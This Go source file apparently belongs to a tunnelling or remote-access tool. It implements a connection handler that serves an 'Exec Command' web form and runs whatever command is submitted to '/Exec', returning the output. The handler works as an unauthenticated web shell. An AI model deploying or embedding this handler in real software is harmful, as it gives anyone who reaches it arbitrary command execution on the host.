package engine

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"net/http"
	"os/exec"
	"strings"
)

type Command struct {
	chRead  net.Conn
	chWrite net.Conn

	EmpytConn
}

func NewCommand() net.Conn {
	cmd := &Command{NewChannelConn(), NewChannelConn(), EmpytConn{}}
	go cmd.doRequest()
	return cmd
}

func (conn *Command) Read(b []byte) (n int, err error) {
	return conn.chRead.Read(b)
}

func (conn *Command) doRequest() {
	defer conn.chRead.Close()
	defer conn.chWrite.Close()

	for {
		req, err := http.ReadRequest(bufio.NewReader(conn.chWrite))
		if err != nil {
			log.Println("Command Read Failed:", err)
			break
		}
		var resp http.Response
		resp.StatusCode = http.StatusOK

		var body string

		if req.URL.Path == "/Exec" {
			cmd := req.FormValue("Command")
			log.Println("Exec:", cmd)

			cc := strings.Split(cmd, " ")

			log.Println("cc:", cmd)
			if len(cc) > 0 {
				inst := exec.Command(cc[0], cc[1:]...)
				out, err := inst.Output()
				if err == nil {
					body = string(out)
				} else {
					body = "Exec Failed:" + cmd + "->" + err.Error()
				}
			}
		} else if req.URL.Path == "/" {
			body = "<html><head><title>Exec Command</title></head>" +
				"<body><form action = '/Exec', method='POST' target='ResultFrame'>" +
				"<p>Command: <input type='text' name='Command' /></p>" +
				"<input type='submit' value='Exec' />" +
				"</form><iframe name='ResultFrame'></iframe></body></html>"
		} else {
			conn.chRead.Write([]byte(fmt.Sprintf("HTTP/1.1 %d %s\r\n\r\n", http.StatusForbidden, "Forbidden")))
			break
		}

		_, err = conn.chRead.Write([]byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length:%d\r\n\r\n%s", len(body), body)))
		if err != nil {
			break
		}
	}
}

func (conn *Command) Write(b []byte) (n int, err error) {
	return conn.chWrite.Write(b)
}

func (conn *Command) Close() error {
	conn.chWrite.Close()
	conn.chRead.Close()
	return nil
}
